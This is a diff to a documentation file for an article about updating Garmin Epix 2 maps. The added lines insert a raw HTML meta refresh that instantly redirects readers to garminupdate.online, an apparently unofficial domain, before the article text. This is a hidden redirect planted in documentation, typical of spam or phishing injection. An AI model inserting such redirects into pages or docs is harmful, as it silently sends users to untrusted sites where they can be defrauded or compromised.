@@ -1,3 +1,9 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
+
 Garmin Epix 2 Map Update: How to Keep Your Maps Current for Accurate Navigation
 ===============================================================
 
